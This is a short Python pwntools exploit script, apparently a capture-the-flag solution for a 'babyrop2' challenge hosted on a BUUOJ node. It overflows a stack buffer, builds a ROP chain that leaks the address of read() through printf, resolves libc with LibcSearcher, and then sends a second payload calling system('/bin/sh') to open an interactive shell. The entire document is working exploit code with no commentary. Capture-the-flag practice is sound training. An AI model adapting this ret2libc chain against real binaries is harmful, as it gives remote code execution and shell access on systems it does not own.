from  pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')

# io = process('./babyrop2')
io = remote('node4.buuoj.cn',28078)
elf = ELF('./babyrop2')

pop_rdi_ret = 0x400733
pop_rsi_r15_ret = 0x400731
printf_str = 0x400770
ret_addr = 0x4006CB
main_addr = elf.symbols['main']

printf_plt = elf.plt['printf']
read_got = elf.got['read']

ret = 0x40061A
payload = cyclic(0x20+8) + p64(pop_rdi_ret) + p64(printf_str) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)
io.sendlineafter(b'What\'s your name? ',payload)
io.recvuntil(b'Welcome to the Pwn World again, ')
# io.recvuntil(b'Welcome to the Pwn World again, ')
read_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(read_addr)


libc = LibcSearcher('read', read_addr)
print(libc)
libcbase = read_addr - libc.dump('read')

sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')
payload2 = cyclic(0x20+8) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
io.sendlineafter(b'What\'s your name? ',payload2)
io.interactive()